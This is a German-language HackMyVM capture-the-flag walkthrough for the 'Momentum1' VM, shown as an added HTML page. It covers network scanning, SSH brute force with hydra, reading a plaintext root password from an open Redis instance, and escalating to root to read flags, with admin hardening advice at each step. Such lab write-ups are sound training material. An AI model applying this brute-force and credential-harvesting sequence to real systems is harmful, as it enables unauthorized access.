@@ -1,0 +1,286 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Momentum1 - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body class="level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+ 
+    <div class="header-bg level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+        <h1>Momentum1 - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2> <!-- H2 ohne Inline-Style, Farbe via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe via CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nodejs</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">redis-cli</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <!-- Kein separater POC, da PrivEsc direkt erfolgt -->
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.112</span>   <span class="command">08:00:27:68:b7:50</span>       PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerk mittels ARP-Requests nach aktiven Geräten zu durchsuchen. Es wurde ein Host mit der IP-Adresse <span class="command">192.168.2.112</span> und der MAC-Adresse <span class="command">08:00:27:68:b7:50</span> (zugeordnet zu PCS Systemtechnik GmbH, oft Oracle VirtualBox) gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreiche Identifizierung des Zielsystems "Momentum1" im lokalen Netzwerk. Dies ist die Grundlage für weitere Scans.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel-IP notieren. Führen Sie Port-Scans (z.B. mit `nmap`) durch, um offene Dienste zu entdecken.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit für ARP-Scans einschränken. Überwachung von ARP-Aktivitäten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.112 -p-</span></div>
+                    <pre>
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span>
+[...] <span class="password"># Gekürzte Nmap-Ausgabe im Originaltext</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sS` SYN-Scan, `-sC` Standard-Skripte, `-sV` Versionserkennung, `-T5` Aggressives Timing, `-A` OS-Erkennung etc., `-p-` alle Ports) wird auf das Ziel <span class="command">192.168.2.112</span> angewendet. Die (gekürzte) Ausgabe zeigt zwei offene Ports: Port <span class="command">22 (SSH)</span> mit OpenSSH 7.9p1 und Port <span class="command">80 (HTTP)</span> mit Apache 2.4.38.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die primären Angriffsvektoren sind SSH und der Webserver. Die spezifischen Versionen sind für die Suche nach bekannten Schwachstellen (CVEs) relevant, obwohl hier keine offensichtlichen kritischen Lücken direkt ersichtlich sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Webserver auf Port 80 gründlich (Directory Busting, Analyse der Webanwendung). Versuchen Sie schwache oder Standard-Zugangsdaten für SSH.<br><strong>Empfehlung (Admin):</strong> Halten Sie SSH- und Apache-Dienste aktuell gepatcht. Konfigurieren Sie SSH sicher (z.B. Key-basierte Authentifizierung bevorzugen, Root-Login deaktivieren). Sichern Sie die Webanwendung ab.</p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.112 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt</span></div>
+                    <pre>
+===============================================================
+Gobuster vX.Y.Z
+===============================================================
+[+] Url:                     http://192.168.2.112
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Extensions:              php,html,xml,zip,7z,tar,bak,sql,py,pl,txt
+[+] Expanded:                true
+[...]
+===============================================================
+Starting gobuster
+===============================================================
+<span class="command">http://192.168.2.112/index.html</span>           (Status: 200) [Size: 2001]
+<span class="command">http://192.168.2.112/img</span>                  (Status: 301) [Size: 312] [--> http://192.168.2.112/img/]
+<span class="command">http://192.168.2.112/css</span>                  (Status: 301) [Size: 312] [--> http://192.168.2.112/css/]
+<span class="command">http://192.168.2.112/manual</span>               (Status: 301) [Size: 315] [--> http://192.168.2.112/manual/]
+<span class="command">http://192.168.2.112/js</span>                   (Status: 301) [Size: 311] [--> http://192.168.2.112/js/]
+===============================================================
+Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit `gobuster dir` wird der Webserver auf Port 80 nach Verzeichnissen und Dateien durchsucht. `-w` gibt die Wortliste an, `-e` zeigt die volle URL, `-x` testet verschiedene Dateiendungen. Es werden Standardverzeichnisse wie `/img`, `/css`, `/js` sowie eine `index.html` und ein Verzeichnis `/manual` gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Fund des `/manual`-Verzeichnisses ist potenziell interessant, da es möglicherweise Dokumentationen, Konfigurationshinweise oder sogar Schwachstellen enthalten könnte. Die anderen Funde sind Standard und weniger wahrscheinlich für einen direkten Exploit relevant.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Inhalt des `/manual`-Verzeichnisses genauer. Analysieren Sie den Quellcode der `index.html` und anderer gefundener Ressourcen auf Hinweise.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass das `/manual`-Verzeichnis keine sensiblen Informationen enthält. Deaktivieren Sie den Zugriff auf Apache-Manuals oder andere Standard-Dokumentationen auf Produktionssystemen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">nodejs main.js</span></div>
+                    <pre><span class="command">auxerre-alienum</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Node.js-Skript namens `main.js` wird ausgeführt (der Ursprung dieses Skripts ist im Log nicht dokumentiert - es könnte lokal sein oder zuvor vom Zielserver heruntergeladen worden sein). Das Skript gibt die Zeichenkette `<span class="command">auxerre-alienum</span>` aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein sehr wichtiger Fund. Die Ausgabe `<span class="command">auxerre-alienum</span>` sieht stark nach einem kombinierten Benutzernamen und Passwort (oder einem Teil davon) aus, möglicherweise `<span class="command">auxerre</span>` als Benutzer und `<span class="command">alienum</span>` oder `<span class="command">auxerre-alienum</span>` als Passwort. Dies muss im Kontext des SSH-Dienstes überprüft werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, die Zeichenkette als potenzielle Zugangsdaten für den SSH-Dienst zu verwenden. Erstellen Sie eine kleine Wortliste mit Variationen (`auxerre`, `alienum`, `auxerre-alienum`) und verwenden Sie ein Tool wie Hydra, um einen Brute-Force-Angriff auf den SSH-Dienst mit dem vermuteten Benutzernamen `auxerre` durchzuführen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Anwendungen und Skripte keine Zugangsdaten oder andere sensible Informationen im Klartext ausgeben oder speichern. Überprüfen Sie, woher dieses Skript stammt und warum es diese Information preisgibt.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">vi passwort.txt</span></div>
+                    <pre>
+[Inhalt der erstellten Passwortdatei]
+auxerre
+auxerre-<span class="password">REMVED</span> <span class="password"><-- Vermutlich Tippfehler, sollte alienum sein?</span>
+auxerre-<span class="password">REMVED</span>
+auxerre-
+<span class="command">auxerre-alienum</span> <span class="password"><-- Korrekte Kombination</span>
+-alienum
+alienum
+alienum
+alienum-
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Basierend auf der Ausgabe des Node.js-Skripts wird eine Passwortdatei (`passwort.txt`) erstellt, die verschiedene Variationen und Kombinationen der Strings "auxerre" und "alienum" enthält. Diese Datei dient als Eingabe für einen Brute-Force-Angriff.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Sinnvolle Vorbereitung für den Hydra-Angriff, um die aus dem Node.js-Skript gewonnenen Informationen zu testen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie diese Datei mit Hydra, um den SSH-Login zu testen.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">hydra -l auxerre -P passwort.txt ssh://192.168.2.112:22</span></div>
+                    <pre>
+Hydra vX.Y.Z (c) 20XX by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at XXXX-XX-XX XX:XX:XX
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 9 login tries (l:1/p:9), ~1 try per task
+[DATA] attacking ssh://192.168.2.112:22/
+[ATTEMPT] target 192.168.2.112 - login "<span class="command">auxerre</span>" - pass "<span class="password">auxerre-alienum</span>" - 1 of 9 [child 0]
+[22][ssh] host: 192.168.2.112   login: <span class="command">auxerre</span>   password: <span class="password">auxerre-alienum</span> <span class="password"><-- Erfolg!</span>
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at XXXX-XX-XX XX:XX:XX
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `hydra` wird verwendet, um einen Brute-Force-Angriff gegen den SSH-Dienst auf <span class="command">192.168.2.112</span> (Port 22) durchzuführen. `-l auxerre` gibt den zu testenden Benutzernamen an. `-P passwort.txt` gibt die zuvor erstellte Passwortdatei an. Hydra testet die Kombinationen durch.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich! Hydra findet die gültigen Zugangsdaten: Benutzername `<span class="command">auxerre</span>` und Passwort `<span class="password">auxerre-alienum</span>`. Dies bestätigt die Vermutung aus der Node.js-Ausgabe.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die gefundenen Zugangsdaten, um sich per SSH am Zielsystem anzumelden.<br><strong>Empfehlung (Admin):</strong> Starke Passwortrichtlinien durchsetzen. Brute-Force-Schutzmechanismen wie `fail2ban` für SSH implementieren. Ursache für das Credential-Leak im Node.js-Skript finden und beheben.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">ssh auxerre@moment.hmv</span></div> <span class="password"><-- Annahme: moment.hmv wurde zu /etc/hosts hinzugefügt</span>
+                    <pre>
+auxerre@192.168.2.112's password: <span class="password">[Passworteingabe: auxerre-alienum]</span>
+Linux Momentum 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
+[...]
+Last login: ...
+auxerre@Momentum:~$ <span class="password"># Login erfolgreich</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird eine SSH-Verbindung zum Zielsystem (hier als `moment.hmv` angesprochen, was eine lokale Hosts-Datei-Konfiguration oder DNS-Auflösung voraussetzt) mit dem Benutzernamen `auxerre` und dem von Hydra gefundenen Passwort `auxerre-alienum` aufgebaut.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Initial Access erfolgreich! Eine interaktive Shell als Benutzer `auxerre` wurde erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der Post-Exploitation und Privilege Escalation Enumeration: `id`, `sudo -l`, `find / -perm -4000 2>/dev/null`, Überprüfung laufender Dienste und Konfigurationen (insbesondere Redis, falls bekannt oder vermutet).<br><strong>Empfehlung (Admin):</strong> Passwortrichtlinien, Brute-Force-Schutz.</p>
+
+        </section>
+
+        <!-- Kein separater POC-Abschnitt, da die PrivEsc sehr direkt ist -->
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">auxerre@Momentum:~$ <span class="command">redis-cli</span></div>
+                    <pre>127.0.0.1:6379></pre>
+                     <div class="prompt">127.0.0.1:6379> <span class="command">KEYS *</span></div>
+                     <pre>1) "<span class="command">rootpass</span>"</pre>
+                     <div class="prompt">127.0.0.1:6379> <span class="command">GET rootpass</span></div>
+                     <pre>"<span class="password">m0mentum-al1enum</span>"</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als Benutzer `auxerre` wird das Kommandozeilen-Tool `redis-cli` gestartet, das sich standardmäßig mit einem lokalen Redis-Server auf Port 6379 verbindet. Der Befehl `KEYS *` listet alle Schlüssel in der Datenbank auf, was hier nur den Schlüssel `<span class="command">rootpass</span>` ergibt. Der Befehl `GET rootpass` ruft den Wert ab, der diesem Schlüssel zugeordnet ist: die Zeichenkette `<span class="password">m0mentum-al1enum</span>`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritische Schwachstelle und direkter Weg zur Root-Eskalation! Der Redis-Server läuft lokal, ist ohne Authentifizierung zugänglich und speichert das Root-Passwort im Klartext unter einem leicht erratbaren Schlüsselnamen (`rootpass`).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie das gefundene Passwort `<span class="password">m0mentum-al1enum</span>`, um mit `su root` zum Root-Benutzer zu wechseln.<br><strong>Empfehlung (Admin):</strong> Sichern Sie die Redis-Instanz dringend ab:
+            1.  Setzen Sie ein starkes Passwort mit `CONFIG SET requirepass <IhrStarkesPasswort>`.
+            2.  Binden Sie Redis nur an das benötigte Interface (z.B. `bind 127.0.0.1 ::1`), wenn kein externer Zugriff nötig ist.
+            3.  Verwenden Sie keine unsicheren Befehle wie `KEYS *` in Produktionsumgebungen (kann bei großen Datenbanken blockieren) und erwägen Sie, gefährliche Befehle umzubenennen oder zu deaktivieren (`rename-command`).
+            4.  Speichern Sie niemals sensible Daten wie Root-Passwörter im Klartext in Redis.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">auxerre@Momentum:~$ <span class="command">su root</span></div>
+                    <pre>Password:</pre>
+                    <div class="prompt"># <span class="command">[Passworteingabe: m0mentum-al1enum]</span></div>
+                    <pre>root@Momentum:/home/auxerre# <span class="password"># Root-Zugriff erfolgreich!</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `su root` wird ausgeführt. Auf die Passwortaufforderung wird das aus Redis extrahierte Passwort `<span class="password">m0mentum-al1enum</span>` eingegeben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Die Privilege Escalation war erfolgreich. Durch Ausnutzung des unsicheren Redis-Servers wurde das Root-Passwort erlangt und der Wechsel zum Root-Benutzer vollzogen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Zugriff ist erreicht. Lesen Sie die User- und Root-Flags.<br><strong>Empfehlung (Admin):</strong> Dringend die Redis-Instanz absichern (siehe vorherige Empfehlung). Ändern Sie das Root-Passwort. Überprüfen Sie das System auf weitere Schwachstellen oder Fehlkonfigurationen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">root@Momentum:/home/auxerre# <span class="command">ls</span></div>
+                    <pre>user.txt</pre>
+                    <div class="prompt">root@Momentum:/home/auxerre# <span class="command">cat user.txt</span></div>
+                    <pre>
+[ Momentum - User Pwned ]
+---------------------------------------
+flag : <span class="password">84157165c30ad34d18945b647ec7f647</span>
+---------------------------------------
+</pre>
+                    <div class="prompt">root@Momentum:/home/auxerre# <span class="command">cat /root/root.txt</span></div>
+                    <pre>
+[ Momentum - Rooted ]
+---------------------------------------
+Flag : <span class="password">658ff660fdac0b079ea78238e5996e40</span>
+---------------------------------------
+by alienum with <3
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Root-Benutzer werden die Dateien `/home/auxerre/user.txt` und `/root/root.txt` gelesen, um die entsprechenden Flags zu extrahieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Beide Flags wurden erfolgreich gefunden und gelesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Flags dokumentieren. Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flags. Fokus auf die Behebung der Sicherheitslücken (Credential Leak, unsicherer Redis-Server).</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                    <div class="flag-value"><span class="password">84157165c30ad34d18945b647ec7f647</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">658ff660fdac0b079ea78238e5996e40</span></div>
+                </div>
+            </div>
+        </section>
+
+   <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 23. November 2020</p> <!-- Datum angepasst -->
+    </footer>
+</body>
+</html>
